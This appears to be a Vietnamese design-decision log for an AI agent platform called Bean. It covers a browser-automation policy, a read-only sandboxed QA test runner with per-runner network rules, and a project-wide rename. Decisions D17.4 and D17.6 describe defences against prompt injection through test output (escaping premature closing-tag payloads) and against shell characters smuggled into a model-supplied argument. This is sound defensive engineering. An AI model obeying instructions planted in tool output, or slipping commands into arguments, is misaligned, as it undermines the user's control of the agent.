| D26.7 | Một tiến trình Chrome **dùng chung** cho cả tiến trình Bean, có "trang hiện tại" chung | `Browser::launch` mất 1–3 giây (mỗi tool call một cái là 5–30 giây/lượt), và chết giữa chuỗi lệnh sẽ **mất sạch** cookie/localStorage — QA không test được luồng nhiều bước. | Trạng thái dùng chung tiến trình, không phải theo phiên hội thoại (giống `SessionPolicy`). Bù lại: 4 lớp dọn tiến trình con — `shutdown`, idle, `reap_orphans` (đọc `DevToolsActivePort`, chỉ kill khi `/proc/<pid>/cmdline` chứa đúng `--user-data-dir` nên không nhầm PID), và kill của chính crate. |
| D26.8 | `browser_evaluate_script` **luôn** `Dangerous`, kể cả origin trong whitelist | Chạy JS tuỳ ý tương đương thực thi mã: đọc được cookie phiên, localStorage, gọi API nội bộ bằng chính quyền người dùng đang đăng nhập. Whitelist nói "trang này là môi trường test của bạn", **không** nói "an toàn để thực thi". | Một lượt hàng trăm lệnh phải bấm Duyệt từng lần — đó là cái giá đúng. `Policy` bảo đảm `Dangerous` không bao giờ có tuỳ chọn session-wide. |

## 18. QA test-runner — vai trò `qa` chạy test có sẵn (D17.x — 2026-09-28)

Đóng khoảng trống: tag `test-run` đã tồn tại trong RBAC (M21) nhưng **chưa tool nào dùng**,
nên vai trò `qa` không chạy được lệnh test nào — dù `Plan.md` mục 2b giao cho nó đúng việc
"review diff, chạy test độc lập". Crate mới `crates/bean-qa`, khuôn mẫu bắt buộc là
`bean-scan` (M23).

| # | Quyết định | Vì sao | Hệ quả đã chấp nhận |
|---|-----------|--------|---------------------|
| D17.1 | `Sandbox::run_argv_readonly` là hàm **MỚI**, không sửa `run_argv`/`run_shell` | `run_argv` mount workspace **ghi được** vì `run_shell` cần build (`target/`, `node_modules/`). Hạ xuống read-only thì vai trò `developer` mất quyền ghi; đổi chung sẽ phá bất biến four-eyes của M21.6. Phần cờ bảo mật được tách thành `docker_shared_flags` để **một** nguồn sự thật — khác biệt giữa hai đường chỉ là `:ro`, `--workdir` và các cờ `-e` tường minh. | Test `readonly_args_keep_exactly_the_same_security_flags_as_writable_path` khẳng định phần cờ còn lại **giống hệt**, chống hồi quy âm thầm khi ai đó sửa `docker_shared_flags` sau này. `run_shell` **không đổi một dòng nào**. |
| D17.2 | Cờ mạng **mặc định theo runner**, `cargo_test = true` là **ngoại lệ có chủ đích**; không cấu hình được | `CARGO_HOME=/tmp/cargo` nằm trong container `--rm` ⇒ cache crates.io không tồn tại giữa hai lần chạy, nên không có mạng thì suite Rust **không build được**. Đây là lý do kỹ thuật bắt buộc, không phải sơ suất — trái với mặc định `--network none` của toàn hệ thống. `vitest`/`pytest` chạy offline được nên giữ `--network none` như lớp phòng thủ chống test tự gọi mạng. | `QaRunner::needs_network()` **cố ý không đọc cấu hình**; `validate()` ghi đè giá trị khai và `tracing::warn!` nếu lệch. `[[qa.suites]]` không có trường nào lật ngược được. Test `qa_network_flag_is_locked_per_runner` chứng minh cả hai chiều. Khi đổi sang image có sẵn toolchain/cache thì đảo quyết định ở **đúng một chỗ**. |
| D17.3 | `qa_test` là `Confirm` và **CÓ** tuỳ chọn "cho phép trong phiên" — khác `security_scan` của M23 | M23 là quét hạ tầng: chạy lại có thể kích cảnh báo mức cao, tạo tải ngoài ý muốn. `qa_test` chỉ đọc workspace qua mount read-only thật, không đụng hệ thống ngoài, và một phiên review thực tế lặp "test hỏng → sửa → chạy lại" nhiều lần — hỏi từng lần làm QA bị ngợp. | **Điều kiện ràng buộc quyết định này:** mount `:ro` của `run_argv_readonly` phải giữ nguyên. Nới thành ghi được là mất four-eyes ⇒ phải quay lại xét lại chính quyết định này. Ghi rõ ngay trong doc comment của hàm để người sửa sau không bỏ sót. |
| D17.4 | `QaReport` **và** raw log đều bọc `<untrusted_content>`, **không** có ngoại lệ "đã chuẩn hoá" | Tên test, tên fixture, assertion message nằm trong quyền kiểm soát của code dự án — đúng loại nguồn mà S1 (2026-09-26) đã vá cho `read_file`/`run_shell` (mục 22.5). Chuẩn hoá chỉ giảm khối lượng, **không** làm nội dung đáng tin hơn. | Test `premature_untrusted_close_tag_is_escaped` chứng minh payload đóng thẻ sớm bị escape, khối bọc chỉ còn **một** thẻ đóng. |
| D17.5 | `QaStatus` tách `Error` khỏi `Failed` | Hai thứ khác hẳn về nghiệp vụ: `Failed` là **dự án** hỏng, `Error` là **hạ tầng kiểm thử** hỏng (build lỗi, thiếu lệnh, timeout). Gộp lại sẽ khiến Manager kết luận sai về chất lượng code. | `parse_output` trả `Error` khi không có dòng tổng kết, khi exit code ≠ 0 mà không có test fail, và khi tiến trình bị kill (`exit_code = None`). Ba test riêng. |
| D17.6 | Tool **không** có tham số `command`/`argv`/`workdir`; `filter` làm sạch ở ranh giới dù đã exec thẳng | `run_argv_readonly` không có `sh -c` nên ký tự shell trong `filter` **không thể** trở thành lệnh. Nhưng `filter` là chuỗi của *model* đi vào argv và vào báo cáo, nên vẫn phải làm sạch (giới hạn 200 ký tự, bộ ký tự hẹp `_ - . : /`). | Đây là **lớp phụ** cạnh rào cản chính là "exec thẳng" — đúng như deny-list mẫu so với sandbox (mục 15.3). Ghi rõ trong doc để không ai tưởng đã thừa. `filter` của `cargo_test` đặt sau `--` nên không bao giờ bị parser hiểu nhầm thành tuỳ chọn. |
| D17.7 | `QaSandboxConfig` **không có** trường `mode`; `to_sandbox_config()` cứng `Docker` | `qa_test` dựa vào mount `:ro` để giữ four-eyes mà chế độ host không thể bảo đảm được. Không có trường `mode` ⇒ **không tồn tại** cách nào lỡ tay hạ cấp cách ly — khác D14.4 của M23 vốn cho phép host kèm cờ `allow_host` tường minh. | `run_argv_readonly` cũng từ chối chế độ host ở tầng runtime (lưới an toàn thứ hai). Người dùng không thể cấu hình QA chạy ngoài container. |
| D17.8 | `[[qa.suites]]` rỗng là **hợp lệ** và nghĩa là "từ chối mọi thứ" | Y hệt `[[infra_scope]]` rỗng của M23 (D14.1). Bật `[qa]` mà chưa khai suite thì chỉ đăng ký được tool không chạy được gì — an toàn hơn là "chạy bất cứ thứ gì". | `validate()` không yêu cầu phải có suite; `SuiteCatalog::is_empty()` dẫn tới nhánh từ chối ở tầng tool, kèm `tracing::warn!` lúc build registry. |

**Xác nhận tường minh (yêu cầu milestone):** M27 **không** mở bất kỳ đường ghi file nào cho
vai trò `qa` dưới bất kỳ hình thức nào — kể cả thư mục "riêng của QA". `forbid_tags =
["dev-write"]` của role `qa` trong `bean.example.toml` **không bị đụng tới**, và
`run_shell` giữ nguyên `required_tags = ["dev-write", "infra-scan"]`. Bằng chứng:
`qa_role_can_run_tests_but_never_write_code` (qa chạy được `qa_test` nhưng không thấy/gọi
được `write_file`/`edit_file`/`run_shell`) và `readonly_sandbox_blocks_writes_into_workspace`
(mount `:ro` ⇒ ghi vào `/workspace` thất bại, cây thư mục workspace thật không đổi trước/sau).


## 19. Đổi tên `BeanAgent`/`beanagent-*` → `bean`/`bean-*` (D18.x — 2026-09-28, milestone M28)

Milestone thuần tuý đổi tên, **không thêm tính năng nào**. Đây là lần đổi tên duy nhất
trước khi coi dự án là production — không để lại giai đoạn "đổi một phần, sau tính tiếp".

| # | Quyết định | Vì sao | Hệ quả đã chấp nhận |
|---|-----------|--------|---------------------|
| D18.1 | Tag `pre-rename-beanagent` **bắt buộc tạo trước mọi thay đổi khác** | Sau khi đổi tên, các tài liệu lịch sử (`status-report.md`, `security-review.md`) **không còn khớp** lệnh/tên crate tại đúng commit chúng mô tả (`399992d`, `62e8350`, `882363d`). Không giữ tên cũ trong văn bản vì những tài liệu đó là bằng chứng, không phải hướng dẫn chạy được. | Tag là cách bù đắp duy nhất: `git checkout pre-rename-beanagent` tái hiện đúng môi trường cũ. Đã xác nhận `git show pre-rename-beanagent:Cargo.toml` vẫn hiện `crates/BeanAgent`, `crates/beanagent-*`. |
| D18.2 | Đổi **cả package lẫn tên binary** của crate bin sang chữ thường `bean` (thay vì giữ CamelCase như D5.13) | `BeanAgent` viết hoa chữ đầu là thứ hiếm trong hệ sinh thái Rust và trông thừa khi gõ `bean chat` — lệnh thực thi viết thường, tên package viết hoa thì phải gõ `BeanAgent chat`. Nay đã **khớp hẳn** với sơ đồ mục 4 của `agents.md`, tức là "sai khác nhỏ" mà D5.13 ghi nhận **không còn tồn tại**. | `[[bin]] name = "bean"`; `Makefile` dùng `BIN := bean` cho `cargo build -p $(BIN)`; test dùng `env!("CARGO_BIN_EXE_bean")`. **Phá D5.13 có chủ đích** — đoạn lập luận gốc được giữ nguyên kèm khối "Đã thay thế bởi rename" ngay bên dưới, không viết đè. |
| D18.3 | `data.dir` đổi `~/.BeanAgent` → `~/.bean` **không migration tự động** | Dữ liệu cũ gồm `bean.db` (SQLite + FTS5), `auth.toml`, audit log. Tự động copy/sang sẽ là hành động ghi file mà người dùng không yêu cầu, và lệnh copy sai có thể để lại `auth.toml` ở chỗ cũ — tệ hơn hậu quả của việc phải tự chuyển thủ công. | Đây là **breaking change** có chủ đích. Người dùng cũ phải `mv ~/.BeanAgent ~/.bean` một lần; ghi rõ trong `README.md`. Không có đường code nào đọc thư mục tên cũ. |
| D18.4 | Đổi cả biến môi trường và hằng số chuỗi chứa tên: `BEANAGENT_*` → `BEAN_*`, cookie `beanagent_session` → `bean_session`, `beanagent.db` → `bean.db`, image `beanagent-sandbox` → `bean-sandbox` | `grep -rn "beanagent"` sạch trong code là tiêu chí nghiệm thu của milestone. Nếu giữ lại một biến môi trường cũ thì tài liệu hướng dẫn cấu hình phải nhắc cả hai tên ⇒ vi phạm chính tiêu chí đó và gây nhầm lẫn. | `BEAN_MCP_TOKEN`, `BEAN_CONFIG`, `BEAN_MCP_TEST_PID_FILE`, `BEAN_MCP_TEST_DROP_FILE`. `User-Agent` đổi `BeanAgent/<version>` → `bean/<version>` (3 chỗ: `bean-llm/src/http.rs`, `bean-security/src/{ssrf,web}.rs`). |
| D18.5 | Đổi cả user/group hệ điều hành `beanagent` → `bean` và các đường dẫn `/etc|/var/lib|/srv/beanagent` | Cùng lý do với D18.4 — deploy artifact (systemd unit, Dockerfile) là nơi tên cũ dễ sót nhất và tài liệu mục 23 mô tả trực tiếp các đường dẫn này. | `deploy/systemd/bean.service` với `User=bean`, `StateDirectory=bean`, `ConfigurationDirectory=bean`. Dịch vụ cũ phải được `systemctl disable` trước khi deploy bản mới (tên unit đổi ⇒ không upgrade được, phải cài lại). |
| D18.6 | Tài liệu: đổi **mọi** tên identifier kỹ thuật trong tất cả `.md`, kể cả file lịch sử; tên sản phẩm trong văn xuôi → "Bean" | Tài liệu mà không chạy được là tài liệu sai. `README.md` còn ghi `./target/release/BeanAgent` thì người đọc copy lệnh sẽ nhận "No such file or directory" — hỏng hơn cả việc không có tài liệu. | 9 file `.md` được sửa (`AGENTS.md`, `README.md`, `PROMPTS.md`, `Plan.md`, `Updating.md`, `docs/{decisions,known-issues,status-report,security-review}.md`), mỗi file lịch sử thêm dòng ghi chú đầu file trỏ về tag. |
| D18.7 | **Không đổi** tên tool đã đăng ký, **không đổi** kiểu API/giao thức (`ClientMsg`/`ServerMsg`/REST path), **không** viết wizard setup | Đổi tên tool sẽ phá mọi session lịch sử, mọi `allowed_tools` trong `bean.toml`, và mọi RBAC tag đã cấu hình — chi phí vượt xa lợi ích của việc giữ tên nhất quán. Đổi REST path là breaking change với client ngoài. | Đây là **rename thuần tuý**: `read_file`, `run_shell`, `qa_test`… giữ nguyên; `/api/*` giữ nguyên; `web/src/api/generated/` chỉ đổi doc comment phản ánh crate mới. |
| D18.8 | Thay đổi `data.dir` và tên env **không** có đường nâng cấp tương thích ngược | Giữ một lớp đọc tên cũ chỉ để tương thích sẽ phải giữ mã cũ sống mãi, và sẽ mâu thuẫn với D18.4 (tên cũ phải biến mất khỏi code). | Người dùng cũ chấp nhận một bước thủ công. Đây là hệ quả được chấp nhận của việc coi đây là lần đổi tên duy nhất trước production. |

**Kiểm chứng:** `cargo build` + `cargo test --workspace --locked` + `make check` xanh;
`grep -rn "beanagent\|BeanAgent"` trong code (không tính `.md`) **không còn kết quả nào**;
`grep -rln "BeanAgent\|beanagent" *.md docs/*.md` chỉ còn khớp trong các khối bằng chứng
đã liệt kê ở mục "Ngoại lệ cố ý giữ" của báo cáo milestone M28.

